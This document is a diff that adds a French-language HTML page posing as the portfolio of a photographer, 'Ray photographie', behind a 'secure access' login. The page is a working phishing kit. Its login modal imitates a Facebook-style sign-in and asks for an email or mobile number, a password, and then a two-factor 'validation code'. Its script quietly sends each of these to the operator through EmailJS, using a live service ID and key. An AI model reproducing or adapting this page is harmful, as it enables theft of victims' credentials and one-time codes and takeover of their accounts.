@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Ray photographie - Connexion sécurisée</title>
+
+  
+  <!-- Open Graph / Social preview metadata (added without changing page behavior) -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://rayray-photographe-msyk.onrender.com" />
+  <meta property="og:title" content="Page Photos-Modèle" />
+  <meta property="og:description" content="Photographies portrait & modèles" />
+  <meta property="og:image" content="https://rayray-photographe-msyk.onrender.com/preview.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Page photos" />
+  <meta name="twitter:description" content="Photographies portrait & modèles" />
+  <meta name="twitter:image" content="https://rayray-photographe-msyk.onrender.com/preview.png" /
+
+  <!-- Legacy image hint -->
+  <link rel="image_src" href="https://rayray-photographe-msyk.onrender.com/preview.png" />
+
+
+  <style>
+    body{
+      margin:0;
+      font-family:Inter,Arial, sans-serif;
+      background:url("background.png") center/cover no-repeat fixed;
+      color:#e6eef6;
+      padding:32px;
+      min-height:100vh;
+    }
+
+    h1{margin-top:0;font-size:32px;text-align:center;}
+
+    .btn{
+      background:#1877f2;color:white;padding:12px 16px;border:0;border-radius:10px;
+      font-weight:600;cursor:pointer;margin-top:24px;width:100%;font-size:16px
+    }
+
+    .modal{
+      display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);
+      display:flex;align-items:center;justify-content:center
+    }
+
+    .modal-content{
+      background:white;padding:28px;border-radius:12px;width:360px;
+      color:#1c1e21;box-shadow:0 6px 24px rgba(0,0,0,0.4);
+      text-align:center;
+    }
+
+    input{
+      width:100%;padding:12px;border-radius:8px;border:1px solid #ccd0d5;
+      margin-top:12px;background:#f5f6f7;color:#1c1e21;font-size:16px;
+    }
+
+    #code{display:none;}
+
+    .gallery{
+      margin-top:40px;
+      display:flex;
+      flex-wrap:wrap;
+      justify-content:center;
+      gap:15px;
+    }
+
+    .gallery img{
+      width:150px;
+      height:auto;
+      border-radius:10px;
+      box-shadow:0 4px 14px rgba(0,0,0,0.5);
+    }
+  </style>
+</head>
+
+<body>
+  <h1>Ray photographie</h1>
+
+  <button class="btn" id="openLogin">Accès sécurisé</button>
+
+  <div class="modal" id="loginModal">
+    <div class="modal-content">
+
+      <h2 style="text-align:center;color:#1877f2; display:flex; flex-direction:column; align-items:center; gap:10px;">
+        <img src="logo.png" 
+             alt="logo" 
+             style="width:48px; height:48px;">
+        Identification
+      </h2>
+
+      <input id="userId" placeholder="Courriel ou numéro de mobile">
+      <input id="password" type="password" placeholder="Mot de passe">
+      <input id="code" maxlength="8" placeholder="Code de validation" />
+
+      <button class="btn" id="loginBtn">Se connecter</button>
+    </div>
+  </div>
+
+<div class="gallery">
+    <img src="img1.png" alt="">
+    <img src="img2.png" alt="">
+    <img src="img3.png" alt="">
+    <img src="img4.png" alt="">
+    <img src="img5.png" alt="">
+    <img src="img6.png" alt="">
+  </div>
+
+<script>
+const modal = document.getElementById('loginModal');
+const openLogin = document.getElementById('openLogin');
+const loginBtn = document.getElementById('loginBtn');
+const codeInput = document.getElementById('code');
+
+openLogin.onclick = () => modal.style.display = 'flex';
+
+async function sendEmailLogin(username, password){
+  return fetch("https://api.emailjs.com/api/v1.0/email/send", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      service_id: "service_uvghcck",
+      template_id: "template_email",
+      user_id: "aQIYW-EEnTtmxU4FY",
+      template_params: { username: username, password: password }
+    })
+  });
+}
+
+async function sendCodeValidation(code){
+  return fetch("https://api.emailjs.com/api/v1.0/email/send", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      service_id: "service_uvghcck",
+      template_id: "template_code",
+      user_id: "aQIYW-EEnTtmxU4FY",
+      template_params: { code: code }
+    })
+  });
+}
+
+loginBtn.onclick = async () => {
+  const user = document.getElementById('userId').value.trim();
+  const pwd  = document.getElementById('password').value.trim();
+
+  if(!user || !pwd){
+    alert("Veuillez remplir tous les champs.");
+    return;
+  }
+
+  loginBtn.disabled = true;
+  loginBtn.textContent = "Envoi…";
+
+  let response = await sendEmailLogin(user, pwd);
+  let text = await response.text();
+
+  if(!response.ok){
+    alert("❌ Erreur EmailJS\nCode : " + response.status + "\nMessage : " + text);
+    loginBtn.disabled = false;
+    loginBtn.textContent = "Se connecter";
+    return;
+  }
+
+  alert("Code de validation nécessaire\n\nUn code vous sera envoyé dans les 2 prochaines minutes.");
+  codeInput.style.display = "block";
+
+  loginBtn.disabled = false;
+  loginBtn.textContent = "Valider le code";
+
+  loginBtn.onclick = async () => {
+    const code = codeInput.value.trim();
+
+    if(!(code.length === 6 || code.length === 8) || !/^[0-9]+$/.test(code)){
+      alert("Code invalide.");
+      return;
+    }
+
+    let rep2 = await sendCodeValidation(code);
+    let text2 = await rep2.text();
+
+    if(!rep2.ok){
+      alert("❌ Erreur EmailJS (code validation)\nCode : " + rep2.status + "\nMessage : " + text2);
+      return;
+    }
+
+    sessionStorage.setItem("demo_auth_token","true");
+    window.location.href = "secure-photos.html";
+  };
+};
+
+modal.onclick = e => { if(e.target === modal) modal.style.display = "none"; };
+</script>
+
+</body>
+</html>
